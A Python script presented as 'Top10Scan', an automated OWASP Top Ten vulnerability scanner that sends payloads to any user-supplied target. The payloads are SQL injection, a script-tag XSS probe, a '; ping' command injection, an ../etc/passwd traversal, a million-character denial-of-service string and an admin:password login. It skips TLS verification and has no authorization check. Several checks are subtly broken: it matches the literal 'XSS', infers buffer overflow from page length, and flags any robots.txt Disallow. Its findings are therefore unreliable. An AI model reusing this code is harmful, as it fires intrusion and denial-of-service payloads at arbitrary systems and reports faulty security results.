import requests
import re

# Function to check for SQL injection vulnerability
def check_sql_injection(url):
    payload = "' OR 1=1 --"
    response = requests.get(url + payload, verify=False)
    if re.search("You have an error in your SQL syntax", response.text):
        return True
    else:
        return False

# Function to check for cross-site scripting vulnerability
def check_xss(url):
    payload = "<script>alert('XSS')</script>"
    response = requests.get(url + payload, verify=False)
    if re.search("XSS", response.text):
        return True
    else:
        return False

# Function to check for buffer overflow vulnerability
def check_buffer_overflow(url):
    payload = "A" * 1000
    response = requests.get(url + payload, verify=False)
    if len(response.text) > 1000:
        return True
    else:
        return False

# Function to check for command injection vulnerability
def check_command_injection(url):
    payload = "; ping google.com"
    response = requests.get(url + payload, verify=False)
    if re.search("PING", response.text):
        return True
    else:
        return False

# Function to check for path traversal vulnerability
def check_path_traversal(url):
    payload = "../etc/passwd"
    response = requests.get(url + payload, verify=False)
    if re.search("root:", response.text):
        return True
    else:
        return False

# Function to check for denial of service vulnerability
def check_dos(url):
    payload = "A" * 1000000
    response = requests.get(url + payload, verify=False)
    if response.status_code == 503:
        return True
    else:
        return False

# Function to check for weak passwords
def check_weak_passwords(url):
    payload = "admin:password"
    response = requests.post(url + "/login", data=payload, verify=False)
    if response.status_code == 200:
        return True
    else:
        return False

# Function to check for insecure configuration
def check_insecure_configuration(url):
    response = requests.get(url + "/robots.txt", verify=False)
    if re.search("Disallow:", response.text):
        return True
    else:
        return False

# Function to check for insufficient logging and monitoring
def check_insufficient_logging(url):
    response = requests.get(url + "/error_log", verify=False)
    if re.search("Error", response.text):
        return True
    else:
        return False

# Function to check for lack of transport encryption
def check_lack_of_transport_encryption(url):
    if url.startswith("http://"):
        return True
    else:
        return False

# Main function to call all the vulnerability checks
def main():
    # Display title banner
    print("***************")
    print("*  Top10Scan  *")
    print("* A lightweight Automated OWASP Top Ten Vulnerability scanner in Python *")
    print("* By Adam Rivers of Hello Security LLC *")
    print("***************")

    # Prompt the user to input the target IP address or URL
    target = input("Enter the target IP address or URL: ")

    # Check for SQL injection vulnerability
    if check_sql_injection(target):
        print("SQL injection vulnerability found!")

    # Check for cross-site scripting vulnerability
    if check_xss(target):
        print("Cross-site scripting vulnerability found!")

    # Check for buffer overflow vulnerability
    if check_buffer_overflow(target):
        print("Buffer overflow vulnerability found!")

    # Check for command injection vulnerability
    if check_command_injection(target):
        print("Command injection vulnerability found!")

    # Check for path traversal vulnerability
    if check_path_traversal(target):
        print("Path traversal vulnerability found!")

    # Check for denial of service vulnerability
    if check_dos(target):
        print("Denial of service vulnerability found!")

    # Check for weak passwords
    if check_weak_passwords(target):
        print("Weak passwords found!")

    # Check for insecure configuration
    if check_insecure_configuration(target):
        print("Insecure configuration found!")

    # Check for insufficient logging and monitoring
    if check_insufficient_logging(target):
        print("Insufficient logging and monitoring found!")

    # Check for lack of transport encryption
    if check_lack_of_transport_encryption(target):
        print("Lack of transport encryption found!")

if __name__ == "__main__":
    main()
